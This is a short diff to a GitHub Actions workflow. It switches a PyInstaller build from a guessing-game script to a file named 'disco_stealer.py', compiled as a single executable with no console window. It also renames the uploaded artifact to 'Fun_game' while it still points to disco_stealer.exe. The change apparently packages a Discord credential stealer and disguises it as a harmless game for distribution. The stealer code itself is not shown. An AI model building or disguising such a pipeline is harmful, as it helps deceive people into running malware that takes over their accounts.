@@ -29,11 +29,11 @@ jobs:
 
     - name: Build Executable with PyInstaller
       run: |
-        pyinstaller --onefile --noconsole gueesing_game.py
+        pyinstaller --onefile --noconsole disco_stealer.py
 
-    - name: Upload Executable
+    - name: Upload Executable Artifact
       uses: actions/upload-artifact@v4
       with:
-        name: discord_stealer
-        path: dist/discord_stealer.exe
+        name: Fun_game
+        path: dist/disco_stealer.exe
         
